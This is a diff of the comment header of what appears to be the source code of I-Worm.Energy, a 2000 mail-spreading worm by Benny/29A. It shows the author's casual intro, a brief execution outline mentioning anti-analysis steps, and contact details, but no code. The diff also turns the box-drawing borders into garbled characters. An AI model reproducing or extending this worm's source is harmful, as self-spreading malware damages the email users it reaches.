@@ -1,15 +1,15 @@
 
 COMMENT #
 
-                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
-                       	     ³  I-Worm.Energy   ³
-                       	     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
-	                    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
-        	            ³    by Benny/29A    ³
-                	    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+                             ÃšÃ„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Â¿
+                       	     Â³  I-Worm.Energy   Â³
+                       	     Ã€Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã™
+	                    ÃšÃ„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Â¿
+        	            Â³    by Benny/29A    Â³
+                	    Ã€Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã™
 
 hey all...
-ÄÄÄÄÄÄÄÄÄÄÄ
+Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„
 
 it was one b0ring sunday, when I decided to code some small and kewl virus...
 I was tired from coding large projectz (HIV, XTC)... I wanted to code one
@@ -32,7 +32,7 @@ resident heavilly armoured very effective tiny mail-spreading worm.
 
 
 the scheme of execution:
-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„
 
 after execution:
 - anti-* stuff
@@ -63,11 +63,11 @@ If you would like to consult anything with me, feel free to contact me...
 
 
 
-(c) 14th November 2000                            ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
-Czech Republic                                    ³ Benny / 29A ÀÄÄÄÄÄÄÄÄÄÄÄ¿
-                                                  @ benny_29a@privacyx.com  ³
-                                                  @ http://benny29a.cjb.net ³
-                                                  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+(c) 14th November 2000                            ÃšÃ„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Â¿
+Czech Republic                                    Â³ Benny / 29A Ã€Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Â¿
+                                                  @ benny_29a@privacyx.com  Â³
+                                                  @ http://benny29a.cjb.net Â³
+                                                  Ã€Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã„Ã™
 #
 
 
